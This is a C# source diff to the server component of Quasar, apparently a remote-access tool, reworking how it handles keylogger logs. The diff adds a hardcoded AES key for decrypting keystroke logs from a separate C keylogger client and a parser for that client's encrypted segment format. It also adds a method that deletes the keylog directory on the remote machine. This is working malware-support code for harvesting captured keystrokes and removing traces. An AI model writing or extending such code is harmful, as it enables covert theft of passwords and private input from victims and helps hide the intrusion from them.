@@ -1,11 +1,14 @@
+using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
+using Quasar.Common.Enums;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using Quasar.Server.Models;
 using Quasar.Server.Networking;
 using System;
 using System.IO;
+using System.Text;
 
 namespace Quasar.Server.Messages
 {
@@ -38,6 +41,11 @@ namespace Quasar.Server.Messages
         /// The amount of all completed log transfers.
         /// </summary>
         private int _completedTransfers;
+
+        /// <summary>
+        /// AES instance with hardcoded key for C client keylog decryption (same master key as remote_keylogger_aes.c).
+        /// </summary>
+        private static readonly Aes256 CClientAes = new Aes256("KeylogAES256Key01234567890123456");
 
         /// <summary>
         /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
@@ -78,6 +86,21 @@ namespace Quasar.Server.Messages
             _client.Send(new GetKeyloggerLogsDirectory());
         }
 
+        /// <summary>
+        /// Deletes all keylogger log files on the remote client by removing the logs directory.
+        /// </summary>
+        public void DeleteLogsOnClient()
+        {
+            if (string.IsNullOrEmpty(_remoteKeyloggerDirectory))
+            {
+                OnReport("Logs directory unknown (retrieve logs first)");
+                return;
+            }
+
+            _fileManagerHandler.DeleteFile(_remoteKeyloggerDirectory, FileType.Directory);
+            OnReport("Requested deletion of logs on client");
+        }
+
         private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
             _remoteKeyloggerDirectory = message.LogsDirectory;
@@ -98,17 +121,23 @@ namespace Quasar.Server.Messages
 
         private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
         {
-            if (items.Length == 0)
+            /* Only consider real file entries that look like keylogger logs (.bin from C client, .html from C# client). */
+            var logItems = Array.FindAll(items, i =>
+                i.EntryType == FileType.File &&
+                (i.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
+                 i.Name.EndsWith(".html", StringComparison.OrdinalIgnoreCase)));
+
+            if (logItems.Length == 0)
             {
                 OnReport("No logs found");
                 return;
             }
 
-            _allTransfers = items.Length;
+            _allTransfers = logItems.Length;
             _completedTransfers = 0;
             OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));
 
-            foreach (var item in items)
+            foreach (var item in logItems)
             {
                 // don't escape from download directory
                 if (FileHelper.HasIllegalCharacters(item.Name))
@@ -118,7 +147,10 @@ namespace Quasar.Server.Messages
                     return;
                 }
 
-                string localName = item.Name.EndsWith(".html", StringComparison.OrdinalIgnoreCase) ? item.Name : item.Name + ".html";
+                /* Server always uses .html for keylog files; client may send .bin (C client) or .html (C#). */
+                string localName = item.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase)
+                    ? Path.ChangeExtension(item.Name, ".html")
+                    : item.Name;
                 _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), localName, true);
             }
         }
@@ -130,17 +162,56 @@ namespace Quasar.Server.Messages
                 try
                 {
                     _completedTransfers++;
-                    string content;
+                    string content = null;
+                    /* Try C client format: [magic "KLS1"][len4][seg]... or legacy single blob. */
                     try
                     {
-                        content = FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance);
+                        byte[] raw = File.ReadAllBytes(transfer.LocalPath);
+                        if (raw.Length >= 48)
+                        {
+                            var sb = new StringBuilder();
+                            int pos = 0;
+                            const byte K = (byte)'K', L = (byte)'L', S = (byte)'S', One = (byte)'1';
+                            while (pos + 4 <= raw.Length)
+                            {
+                                int segLen;
+                                if (pos + 8 <= raw.Length && raw[pos] == K && raw[pos + 1] == L && raw[pos + 2] == S && raw[pos + 3] == One)
+                                {
+                                    pos += 4;
+                                    segLen = raw[pos] | (raw[pos + 1] << 8) | (raw[pos + 2] << 16) | (raw[pos + 3] << 24);
+                                }
+                                else
+                                    segLen = raw[pos] | (raw[pos + 1] << 8) | (raw[pos + 2] << 16) | (raw[pos + 3] << 24);
+                                pos += 4;
+                                if (segLen < 48 || segLen > raw.Length || pos + segLen > raw.Length)
+                                    break;
+                                byte[] segment = new byte[segLen];
+                                Buffer.BlockCopy(raw, pos, segment, 0, segLen);
+                                pos += segLen;
+                                sb.Append(Encoding.UTF8.GetString(CClientAes.Decrypt(segment)));
+                            }
+                            if (sb.Length >= 10)
+                                content = sb.ToString();
+                            if (content == null && raw.Length >= 48)
+                                content = Encoding.UTF8.GetString(CClientAes.Decrypt(raw));
+                        }
                     }
-                    catch
+                    catch { /* not C client format or corrupt */ }
+                    if (content == null || content.Length < 10)
                     {
-                        /* C client writes plain HTML (no encryption); fall back to raw UTF-8. */
-                        content = File.ReadAllText(transfer.LocalPath, System.Text.Encoding.UTF8);
+                        /* Try C# client format (per-client encryption key). */
+                        try
+                        {
+                            content = FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance);
+                        }
+                        catch
+                        {
+                            OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));
+                            content = null;
+                        }
                     }
-                    File.WriteAllText(transfer.LocalPath, content);
+                    if (content != null)
+                        File.WriteAllText(transfer.LocalPath, content, Encoding.UTF8);
                     OnReport(_allTransfers == _completedTransfers
                         ? "Successfully retrieved all logs"
                         : GetDownloadProgress(_allTransfers, _completedTransfers));
